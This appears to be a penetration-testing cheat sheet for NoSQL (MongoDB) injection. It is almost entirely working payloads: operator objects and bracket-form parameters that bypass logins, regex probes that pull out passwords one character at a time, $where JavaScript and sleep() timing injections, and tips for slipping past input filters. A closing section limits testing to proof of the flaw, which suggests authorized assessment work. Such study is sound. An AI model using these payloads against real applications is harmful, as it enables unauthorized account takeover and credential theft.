# NoSQL Injection

MongoDB and friends. Input reaching a query object where operators (`$ne`, `$gt`, `$regex`) get interpreted. JSON bodies are the prime surface; URL params can also cast to objects (`user[$ne]=x`).

## Tier 1 — Operator injection (auth bypass)
Swap a scalar for an operator object. JSON body:
```json
{"username": "admin", "password": {"$ne": null}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$in": ["admin","administrator","root"]}, "password": {"$ne": 1}}
```
URL-encoded / form (bracket casting):
```
username=admin&password[$ne]=x
username[$ne]=&password[$ne]=
```

## Tier 2 — Regex / known-user auth bypass
Log in as a specific user without the password.
```json
{"username": "admin", "password": {"$regex": "^.*"}}
{"username": {"$regex": "^admin"}, "password": {"$ne": ""}}
```

## Tier 3 — Blind boolean extraction
No output diff except success/fail — extract a secret char by char via regex anchors. Compare responses.
```json
{"username": "admin", "password": {"$regex": "^a"}}   # true if pw starts with 'a'
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^a.{6}$"}}   # length probe
```
Confirm the boolean oracle first (a known-true vs known-false pair), then walk the charset.

## Tier 3 — JS injection ($where / mapReduce)
When the app passes input into server-side JS. Time-based confirms blind.
```json
{"$where": "sleep(5000)"}
{"username": {"$where": "this.password.length > 0"}}
"'; return true; var x='"
"'; return this.password[0]=='a'; var x='"
```
`$where` with `sleep()` = the NoSQL analogue of time-blind SQLi.

## Bypass notes
- Server rejects JSON operators? Try the URL bracket form, or double-encode.
- `$` filtered? Some stacks accept unicode (`$`) or the `[$ne]` param form even when body JSON is sanitized.
- GraphQL/JSON APIs: inject the operator object into a variable, not the query string.

## Stop when
Auth bypass: one successful login/session as another account via an operator payload — capture the request + the authenticated response (do NOT roam that account's data; screenshot the landing page only). Blind: a working boolean oracle or a reproducible `sleep()` delay. Extract at most a couple of chars to prove extraction, not the full secret. Stop.
